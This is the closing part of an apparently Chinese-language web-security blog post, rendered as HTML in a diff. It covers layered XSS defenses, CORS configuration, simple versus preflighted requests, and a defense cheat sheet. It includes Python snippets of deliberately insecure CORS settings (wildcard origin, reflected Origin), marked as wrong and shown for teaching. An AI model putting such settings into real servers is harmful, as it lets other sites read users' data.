+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">层 0：安全文化与工程规范
+</span></span><span class="line"><span class="cl">      在漏洞写入代码之前拦截（SAST 扫描、Code Review、安全培训）
+</span></span><span class="line"><span class="cl">       ↓ 如果开发者仍然写出了危险代码...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">层 1：框架默认安全
+</span></span><span class="line"><span class="cl">      React/Vue/Angular 的模板自动转义，覆盖大多数疏忽
+</span></span><span class="line"><span class="cl">       ↓ 如果使用了 innerHTML/dangerouslySetInnerHTML...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">层 2：输入净化 + 输出编码
+</span></span><span class="line"><span class="cl">      DOMPurify/Jsoup/bleach 消灭语义歧义，白名单过滤富文本
+</span></span><span class="line"><span class="cl">       ↓ 如果净化被 mXSS 等方式绕过...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">层 3：CSP（nonce/hash + strict-dynamic）
+</span></span><span class="line"><span class="cl">      注入成功也无法执行，没有腕带不让进
+</span></span><span class="line"><span class="cl">       ↓ 如果 CSP 因白名单域名存在 JSONP 端点而被绕过...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">层 4：Trusted Types
+</span></span><span class="line"><span class="cl">      在 DOM API 层强制要求净化认证，最后一公里的闸机
+</span></span><span class="line"><span class="cl">       ↓ 如果脚本仍然成功执行...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">层 5：HttpOnly + SameSite Cookie
+</span></span><span class="line"><span class="cl">      最小化攻击成果，切断直接盗取 session 的路径
+</span></span><span class="line"><span class="cl">       ↓ 如果攻击依然成功（所有层都失守）...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">层 6：监控与响应
+</span></span><span class="line"><span class="cl">      CSP Report-Only 模式收集违规日志，及时发现和响应
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>没有哪一层是必须完美的。防御的强度来自攻击者需要同时突破所有层的难度。</p>
+<hr>
+<h2 id="第十章corssop-的授权机制与正确实践">第十章：CORS——SOP 的授权机制与正确实践</h2>
+<h3 id="101-官方开的后门">10.1 官方开的后门</h3>
+<p>现代 Web 开发几乎必然涉及跨域：前后端分离的 API、CDN、第三方统计脚本……这些都需要合法的跨域访问，但又与 SOP 的限制直接冲突。</p>
+<p><strong>CORS（Cross-Origin Resource Sharing）</strong> 是 SOP 的&quot;官方授权机制&quot;——它让服务器可以显式声明：&ldquo;我允许来自这些特定域名的跨域读取请求&rdquo;。</p>
+<p>CORS 不是 SOP 的漏洞，但<strong>错误配置的 CORS 比没有 CORS 还危险</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># ❌ 通配符配置：等于对所有人开放数据读取权</span>
+</span></span><span class="line"><span class="cl"><span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Access-Control-Allow-Origin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;*&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ❌ 盲目反射 Origin：等价于通配符</span>
+</span></span><span class="line"><span class="cl"><span class="n">origin</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Origin&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Access-Control-Allow-Origin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">origin</span>  <span class="c1"># 任何来源都被允许了</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ✅ 白名单校验：只允许可信来源</span>
+</span></span><span class="line"><span class="cl"><span class="n">ALLOWED_ORIGINS</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;https://app.example.com&#39;</span><span class="p">,</span> <span class="s1">&#39;https://admin.example.com&#39;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">origin</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Origin&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">origin</span> <span class="ow">in</span> <span class="n">ALLOWED_ORIGINS</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Access-Control-Allow-Origin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">origin</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 只有在需要跨域携带 Cookie 时才开启，且只能配合具体域名（不能是 *）</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Access-Control-Allow-Credentials&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;true&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="102-简单请求与预检请求cors-机制里最容易被误解的设计">10.2 简单请求与预检请求：CORS 机制里最容易被误解的设计</h3>
+<p>很多人以为 CORS 是在&quot;阻止跨域请求被发送&quot;。这个理解是错的——而且这个误解有真实的安全后果。</p>
+<p><strong>CORS 从来不阻止请求被发送。它只阻止响应被 JavaScript 读取。</strong></p>
+<p>浏览器在执行跨域请求时，会先判断这个请求属于哪种类型，然后采取完全不同的处理方式：</p>
+<p><strong>简单请求（Simple Request）</strong>——同时满足以下条件的请求：</p>
+<ul>
+<li>方法是 <code>GET</code>、<code>HEAD</code> 或 <code>POST</code></li>
+<li>请求头只包含浏览器默认头（如 <code>Content-Type</code> 限于 <code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code>）</li>
+<li>没有自定义请求头</li>
+</ul>
+<p>对简单请求，浏览器的处理是：<strong>直接发出去，然后根据响应头里有没有 CORS 授权，决定是否让 JavaScript 读取响应内容</strong>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">简单请求的处理流程：
+</span></span><span class="line"><span class="cl">浏览器 → 直接发出 POST /api/transfer（附带 Cookie）→ 服务器收到并执行
+</span></span><span class="line"><span class="cl">浏览器 ← 收到响应
+</span></span><span class="line"><span class="cl">浏览器检查响应头有没有 Access-Control-Allow-Origin
+</span></span><span class="line"><span class="cl">  → 没有：JavaScript 看不到响应内容，但请求已经被服务器执行了
+</span></span><span class="line"><span class="cl">  → 有且匹配：JavaScript 可以读取响应
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这就是 CSRF 攻击能奏效的根本原因。<code>&lt;form&gt;</code> 表单的 POST 提交是典型的简单请求，浏览器会直接把它发出去，并且附上 Cookie——<strong>CORS 对这个过程完全没有阻止作用</strong>。只要服务器收到请求就执行，伤害就已经发生，哪怕 JavaScript 后来读不到响应也无济于事。这就是为什么防 CSRF 需要 Token 或 <code>SameSite</code> Cookie，而不能依赖 CORS。</p>
+<p><strong>复杂请求（Preflighted Request）</strong>——不满足简单请求条件的请求，例如：</p>
+<ul>
+<li>方法是 <code>PUT</code>、<code>DELETE</code>、<code>PATCH</code></li>
+<li><code>Content-Type</code> 是 <code>application/json</code></li>
+<li>包含自定义请求头（如 <code>Authorization</code>、<code>X-CSRF-Token</code>）</li>
+</ul>
+<p>对复杂请求，浏览器会先发一个 <strong>OPTIONS 预检请求</strong>，问服务器：&ldquo;我打算从 <code>https://app.com</code> 向你发一个带 <code>Authorization</code> 头的 <code>DELETE</code> 请求，你允许吗？&rdquo;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">OPTIONS</span> <span class="nn">/api/resource</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">https://app.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Access-Control-Request-Method</span><span class="o">:</span> <span class="l">DELETE</span>
+</span></span><span class="line"><span class="cl"><span class="n">Access-Control-Request-Headers</span><span class="o">:</span> <span class="l">Authorization</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>只有服务器明确回应&quot;允许&quot;，浏览器才会发出真正的请求：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">204</span> <span class="ne">No Content</span>
+</span></span><span class="line"><span class="cl"><span class="n">Access-Control-Allow-Origin</span><span class="o">:</span> <span class="l">https://app.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Access-Control-Allow-Methods</span><span class="o">:</span> <span class="l">DELETE</span>
+</span></span><span class="line"><span class="cl"><span class="n">Access-Control-Allow-Headers</span><span class="o">:</span> <span class="l">Authorization</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个设计背后有一个深刻的安全考量：<strong>复杂请求往往是有副作用的操作（删除、修改）</strong>，浏览器在执行前先征得服务器同意，能防止在服务器来不及判断的情况下造成不可逆的伤害。简单请求则被认为是&quot;历史上已经广泛存在的跨域行为&quot;（HTML 表单一直都能跨域 POST），贸然拦截会破坏大量已有的 Web 功能。</p>
+<p>这个区分，再次体现了 SOP 设计之初&quot;嵌入允许、读取禁止&quot;的折中逻辑——对于早已存在的跨域发送行为，CORS 的策略是&quot;允许发，但控制读&quot;，而非&quot;彻底禁止&quot;。</p>
+<h3 id="103-一个常见的混淆csp-与-cors-是两条平行线">10.3 一个常见的混淆：CSP 与 CORS 是两条平行线</h3>
+<p>CSP 的 <code>frame-ancestors</code> 指令能控制&quot;我是否可以被放入别人的 iframe&quot;，这似乎和 CORS 的跨域控制有些像。很多人因此混淆了两者，以为它们在做类似的事情。</p>
+<p>其实它们控制的是完全不同的维度。一个简单的类比：</p>
+<ul>
+<li><strong>CORS</strong> 是在控制&quot;<strong>别人能不能来读我的信件</strong>&quot;（跨域读取数据）</li>
+<li><strong>CSP <code>frame-ancestors</code></strong> 是在控制&quot;<strong>别人能不能把我的照片贴进他的相册</strong>&quot;（被 iframe 嵌入）</li>
+<li><strong>CSP <code>script-src</code></strong> 是在控制&quot;<strong>什么人说的话我才执行</strong>&quot;（脚本执行来源）</li>
+</ul>
+<p>三件事情，三条独立的规则，彼此平行，互不影响。</p>
+<hr>
+<h2 id="结语没有银弹只有体系">结语：没有银弹，只有体系</h2>
+<p>二十五年过去了，XSS 依然是 OWASP Top 10 的常客。</p>
+<p>这不是因为防御技术不够成熟。这是因为 Web 的根本矛盾从未改变：</p>
+<blockquote>
+<p><strong>浏览器必须信任来自服务器的内容，<br>
+而服务器无法完全控制内容的纯净性——<br>
+因为内容的一部分，来自用户。</strong></p>
+</blockquote>
+<p>攻防博弈的循环也从未停止：新的业务需求（富文本、SPA、SSR、WebComponents）带来新的攻击面，攻击者发现并利用它，防御技术被创造出来，攻击者寻找防御的配置错误和边界……</p>
+<p>但有一件事是确定的：这二十五年的所有攻击，都遵循同一个模式——<strong>语义歧义</strong>。同一段数据，在服务器眼中是纯文本，在浏览器眼中是可执行代码；在 HTML 解析器眼中是属性值，在 URL 解析器眼中是协议跳转；在服务端解析器眼中是安全片段，在客户端解析器眼中是危险逃逸。</p>
+<p>这二十五年的所有防御，也都遵循同一个解法——<strong>在数据越过上下文边界之前，消除这种歧义</strong>。输出编码、白名单净化、CSP、Trusted Types，手段不同，但目标一致：让数据在任何解析上下文中，都只能作为数据被理解，而不能被误读为代码。</p>
+<p>理解了这两点，XSS 就不再是一份需要背诵的漏洞清单，而是一个有内在逻辑的安全体系。攻守之道，均由此出。</p>
+<hr>
+<h2 id="附录防御速查">附录：防御速查</h2>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>场景</th>
+          <th>推荐方案</th>
+          <th>需要审查的危险写法</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>普通文本显示</td>
+          <td>框架模板 <code>{{ }}</code> 插值</td>
+          <td><code>innerHTML</code> 直接赋值</td>
+      </tr>
+      <tr>
+          <td>富文本展示</td>
+          <td>DOMPurify + 后端白名单净化</td>
+          <td>正则过滤 / 未净化直接输出</td>
+      </tr>
+      <tr>
+          <td>后端模板输出</td>
+          <td>框架自动转义（Django/Rails/Thymeleaf）</td>
+          <td>手动字符串拼接 HTML</td>
+      </tr>
+      <tr>
+          <td>URL 参数展示</td>
+          <td>URL 编码 + HTML 上下文编码</td>
+          <td>直接拼入 href</td>
+      </tr>
+      <tr>
+          <td>JavaScript 字符串嵌入</td>
+          <td>JS 字符串转义</td>
+          <td>模板字符串直接插值 <code>&quot;${input}&quot;</code></td>
+      </tr>
+      <tr>
+          <td>SSR 状态注入</td>
+          <td>JSON.stringify + <code>\u003c/\u003e</code> 转义</td>
+          <td>直接 <code>${JSON.stringify(state)}</code></td>
+      </tr>
+      <tr>
+          <td>DOM 操作</td>
+          <td><code>textContent</code> 赋值</td>
+          <td><code>innerHTML</code> 赋值不可信数据</td>
+      </tr>
+      <tr>
+          <td>脚本执行控制</td>
+          <td>CSP nonce + strict-dynamic</td>
+          <td><code>unsafe-inline</code></td>
+      </tr>
+      <tr>
+          <td>跨域 API</td>
+          <td>CORS 白名单 Origin 校验</td>
+          <td><code>Access-Control-Allow-Origin: *</code></td>
+      </tr>
+  </tbody>
+</table></div>
+<hr>
+<h2 id="参考">参考</h2>
+<ul>
+<li>Samy Kamkar，Samy 蠕虫技术解析：https://samy.pl/myspace/tech.html</li>
+<li>Amit Klein，《DOM Based Cross Site Scripting or XSS of the Third Kind》，WASC，2005年7月</li>
+<li>PortSwigger Web Security Academy，XSS 章节：https://portswigger.net/web-security/cross-site-scripting</li>
+<li>OWASP XSS Prevention Cheat Sheet：https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</li>
+<li>Google Trusted Types 规范：https://w3c.github.io/trusted-types/dist/spec/</li>
+<li>DOMPurify 项目：https://github.com/cure53/DOMPurify</li>
+</ul>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/web%E5%AE%89%E5%85%A8/">Web安全</a>
+        
+            <a href="/tags/xss/">XSS</a>
+        
+            <a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/">浏览器安全</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css"integrity="sha256-J&#43;iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s="crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js"integrity="sha256-InsNdER1b2xUewP&#43;pKCUJpkhiqwHgqiPXDlIk7GzBu4="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js"integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI="crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });
+    })
+</script>
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2026 DanSec
+    </section>
+    
+    <section class="powerby">
+        
+            Dan❤Anan <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.23.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
